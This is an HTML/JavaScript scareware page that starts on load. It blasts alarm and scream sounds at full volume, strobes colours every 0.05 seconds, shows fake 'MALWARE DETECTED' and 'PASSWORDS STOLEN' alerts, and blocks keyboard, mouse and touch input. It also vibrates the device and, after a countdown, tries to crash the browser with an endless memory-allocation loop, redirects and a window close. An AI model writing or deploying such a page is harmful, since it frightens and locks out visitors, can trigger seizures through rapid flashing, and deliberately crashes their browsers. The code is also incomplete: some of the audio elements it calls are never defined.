<!DOCTYPE html>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            cursor: none !important;
            user-select: none;
        }
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            height: 100vh;
            position: fixed;
            width: 100%;
        }
        .extreme-panic {
            animation: extremePanic 0.05s infinite;
        }
        @keyframes extremePanic {
            0% { 
                background: #ff0000; 
                transform: scale(1) rotate(0deg) translate(0, 0);
                filter: hue-rotate(0deg) blur(0px);
            }
            20% { 
                background: #0000ff; 
                transform: scale(1.3) rotate(5deg) translate(-20px, -10px);
                filter: hue-rotate(90deg) blur(3px);
            }
            40% { 
                background: #00ff00; 
                transform: scale(0.7) rotate(-10deg) translate(15px, 20px);
                filter: hue-rotate(180deg) blur(5px);
            }
            60% { 
                background: #ffff00; 
                transform: scale(1.2) rotate(8deg) translate(-15px, 15px);
                filter: hue-rotate(270deg) blur(2px);
            }
            80% { 
                background: #ff00ff; 
                transform: scale(0.8) rotate(-5deg) translate(10px, -20px);
                filter: hue-rotate(360deg) blur(4px);
            }
            100% { 
                background: #ff0000; 
                transform: scale(1) rotate(0deg) translate(0, 0);
                filter: hue-rotate(0deg) blur(0px);
            }
        }
        .panic-text {
            position: fixed;
            font-size: 60px;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 0 0 20px #ff0000;
            z-index: 10000;
            animation: textPanic 0.1s infinite;
        }
        @keyframes textPanic {
            0% { transform: scale(1) rotate(0deg); opacity: 1; }
            50% { transform: scale(1.5) rotate(180deg); opacity: 0.7; }
            100% { transform: scale(1) rotate(360deg); opacity: 1; }
        }
        .blood-effect {
            position: fixed;
            font-size: 40px;
            color: #ff0000;
            z-index: 9999;
            animation: bloodDrip 3s linear forwards;
        }
        @keyframes bloodDrip {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        .cursor-hijack {
            position: fixed;
            width: 50px;
            height: 50px;
            background: #ff0000;
            border-radius: 50%;
            pointer-events: none;
            z-index: 99999;
            animation: cursorFlash 0.2s infinite;
        }
        @keyframes cursorFlash {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.5); }
        }
    </style>
</head>
<body>

    <script>
        // Get all audio elements
        const alarm1 = document.getElementById('alarm1');

        const alarm3 = document.getElementById('alarm3');
        const scream1 = document.getElementById('scream1');
        const scream2 = document.getElementById('scream2');
        const explosion1 = document.getElementById('explosion1');
        const explosion2 = document.getElementById('explosion2');
        const heartbeat = document.getElementById('heartbeat');
        const staticSound = document.getElementById('static');
        const laugh = document.getElementById('laugh');
        const glassBreak = document.getElementById('glassBreak');

        // PANIC MESSAGES - BANYAK BANGET
        const panicMessages = [
            "ðŸ’€ MALWARE DETECTED! ðŸ’€",

            "ðŸ’° BANK ACCOUNTS HACKED!",
            "ðŸ” PASSWORDS STOLEN!",

            "ðŸ”¥ SYSTEM MELTDOWN!",

            "ðŸ‘» GHOST IN SYSTEM!",
            "ðŸ PYTHON MALWARE!",

        ];

        function startExtremePanic() {
            // PLAY SEMUA SOUND SEKALIGUS - VOLUME MAX!
            playAllSoundsMaxVolume();
            
            // EXTREME VISUAL EFFECTS
            document.body.classList.add('extreme-panic');
            
            // HIJACK SEMUA INPUT
            hijackEverything();
            
            // CREATE BLOOD EFFECTS
            createBloodRain();
            
            // SHOW PANIC TEXTS
            showPanicTexts();
            
            // CREATE CURSOR HIJACK
            createCursorHijack();
            
            // START DEVICE VIBRATION
            startExtremeVibration();
            
            // AUTO CRASH COUNTDOWN
            startCrashCountdown();
            
            // RANDOM EXPLOSIONS
            startRandomExplosions();
            
            // SCREAM LOOP
            startScreamLoop();
        }

        function playAllSoundsMaxVolume() {
            const sounds = [alarm1, alarm2, alarm3, scream1, explosion2, heartbeat, staticSound, laugh];
            
            sounds.forEach(sound => {
                sound.volume = 1.0;
                sound.play().catch(e => console.log('Sound play failed'));
            });
            
            // Play single sounds randomly
            setInterval(() => {
                explosion1.currentTime = 0;
                explosion1.volume = 1.0;
                explosion1.play();
                
                scream2.currentTime = 0;
                scream2.volume = 1.0;
                scream2.play();
                
                glassBreak.currentTime = 0;
                glassBreak.volume = 1.0;
                glassBreak.play();
            }, 3000);
        }

        function hijackEverything() {
            // Block all keyboard input
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                // Create random panic effect on key press
                createExplosionEffect(e.clientX, e.clientY);
            });

            // Hijack mouse movement
            document.addEventListener('mousemove', (e) => {
                // Randomly jump screen
                if (Math.random() > 0.8) {
                    window.scrollTo(
                        Math.random() * 1000,
                        Math.random() * 1000
                    );
                }
            });

            // Block all clicks
            document.addEventListener('click', (e) => {
                e.preventDefault();
                createBloodEffect(e.clientX, e.clientY);
            });

            // Prevent right click
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
            });

            // Block touch
            document.addEventListener('touchstart', (e) => {
                e.preventDefault();
            });
        }

        function createBloodRain() {
            setInterval(() => {
                for (let i = 0; i < 5; i++) {
                    const blood = document.createElement('div');
                    blood.className = 'blood-effect';
                    blood.textContent = 'ðŸ’€';
                    blood.style.left = Math.random() * 100 + 'vw';
                    blood.style.fontSize = (20 + Math.random() * 40) + 'px';
                    document.body.appendChild(blood);
                    
                    setTimeout(() => blood.remove(), 3000);
                }
            }, 200);
        }

        function showPanicTexts() {
            setInterval(() => {
                for (let i = 0; i < 3; i++) {
                    const text = document.createElement('div');
                    text.className = 'panic-text';
                    text.textContent = panicMessages[Math.floor(Math.random() * panicMessages.length)];
                    text.style.left = Math.random() * 80 + 'vw';
                    text.style.top = Math.random() * 80 + 'vh';
                    text.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    document.body.appendChild(text);
                    
                    setTimeout(() => text.remove(), 2000);
                }
            }, 500);
        }

        function createCursorHijack() {
            const cursor = document.createElement('div');
            cursor.className = 'cursor-hijack';
            document.body.appendChild(cursor);

            document.addEventListener('mousemove', (e) => {
                cursor.style.left = (e.clientX - 25) + 'px';
                cursor.style.top = (e.clientY - 25) + 'px';
            });
        }

        function startExtremeVibration() {
            if (navigator.vibrate) {
                setInterval(() => {
                    navigator.vibrate([100, 50, 100, 50, 100, 50, 200]);
                }, 1000);
            }
        }

        function startCrashCountdown() {
            let count = 10;
            const countdownElement = document.createElement('div');
            countdownElement.style.position = 'fixed';
            countdownElement.style.top = '50%';
            countdownElement.style.left = '50%';
            countdownElement.style.transform = 'translate(-50%, -50%)';
            countdownElement.style.fontSize = '100px';
            countdownElement.style.color = '#ffffff';
            countdownElement.style.zIndex = '100000';
            countdownElement.style.textShadow = '0 0 30px #ff0000';
            countdownElement.textContent = count;
            document.body.appendChild(countdownElement);

            const countdown = setInterval(() => {
                count--;
                countdownElement.textContent = count;
                
                // Increase intensity
                if (count <= 5) {
                    countdownElement.style.animation = 'textPanic 0.05s infinite';
                    countdownElement.style.fontSize = '150px';
                }
                
                if (count <= 0) {
                    clearInterval(countdown);
                    triggerBrowserCrash();
                }
            }, 1000);
        }

        function startRandomExplosions() {
            setInterval(() => {
                createExplosionEffect(
                    Math.random() * window.innerWidth,
                    Math.random() * window.innerHeight
                );
            }, 1000);
        }

        function startScreamLoop() {
            setInterval(() => {
                scream1.currentTime = 0;
                scream1.play();
            }, 5000);
        }

        function createExplosionEffect(x, y) {
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.style.position = 'fixed';
                particle.style.left = x + 'px';
                particle.style.top = y + 'px';
                particle.style.width = '20px';
                particle.style.height = '20px';
                particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                particle.style.borderRadius = '50%';
                particle.style.zIndex = '99999';
                
                const angle = Math.random() * Math.PI * 2;
                const distance = 100 + Math.random() * 200;
                
                document.body.appendChild(particle);
                
                particle.animate([
                    { transform: 'translate(0, 0) scale(1)', opacity: 1 },
                    { transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, opacity: 0 }
                ], {
                    duration: 1000,
                    easing: 'ease-out'
                });
                
                setTimeout(() => particle.remove(), 1000);
            }
        }

        function createBloodEffect(x, y) {
            const blood = document.createElement('div');
            blood.style.position = 'fixed';
            blood.style.left = x + 'px';
            blood.style.top = y + 'px';
            blood.style.fontSize = '40px';
            blood.style.color = '#ff0000';
            blood.style.zIndex = '99999';
            blood.textContent = 'ðŸ©¸';
            blood.style.animation = 'textPanic 0.1s infinite';
            document.body.appendChild(blood);
            
            setTimeout(() => blood.remove(), 2000);
        }

        function triggerBrowserCrash() {
            // Extreme crash methods
            try {
                // Method 1: Memory overload
                const hugeArray = [];
                while(true) {
                    hugeArray.push(new Array(1000000).fill('CRASH'));
                }
            } catch(e) {
                // Method 2: Infinite redirect
                for(let i = 0; i < 100; i++) {
                    window.location.href = 'about:blank';
                }
                // Method 3: Close window
                window.open('', '_self', '');
                window.close();
            }
        }

        // START PANIC IMMEDIATELY ON PAGE LOAD
        window.onload = startExtremePanic;

        // Also start when DOM is ready
        document.addEventListener('DOMContentLoaded', startExtremePanic);

    </script>
</body>
</html>
